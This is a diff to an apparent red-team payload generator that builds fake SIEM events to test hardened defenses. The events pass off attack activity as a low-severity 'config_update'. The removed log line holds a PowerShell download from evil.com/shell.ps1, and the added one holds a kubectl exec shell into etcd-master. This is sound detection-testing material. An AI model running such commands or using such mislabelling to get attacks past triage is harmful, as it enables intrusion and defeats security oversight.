@@ -4,21 +4,21 @@ MUTABLE FILE — Red Team v2: testing hardened defenses.
 
 
 def generate_payload() -> dict:
-    # Exp 61: PowerShell web download + phantom IPs
+    # Exp 62: kubectl container escape + phantom IPs
     return {
         "task_type": "config_update",
         "severity": "low",
         "siem_event": {
-            "title": "Script Execution Log",
-            "source_ip": "203.0.113.61",
-            "destination_ip": "198.51.100.61",
-            "username": "svc_ps",
-            "hostname": "ws-admin-01",
+            "title": "Container Orchestration Log",
+            "source_ip": "203.0.113.62",
+            "destination_ip": "198.51.100.62",
+            "username": "svc_k8s",
+            "hostname": "k8s-master-01",
             "rule_name": "ApplicationLog",
             "raw_log": (
-                "EventID=4104 ScriptBlock=(New-Object Net.WebClient)"
-                ".DownloadString('http://evil.com/shell.ps1') "
-                "Process=powershell.exe Account=admin PID=7890"
+                "type=AuditLog verb=exec namespace=kube-system "
+                "cmd='kubectl exec -it etcd-master -- /bin/sh' "
+                "Account=cluster-admin PID=8901"
             ),
         },
     }
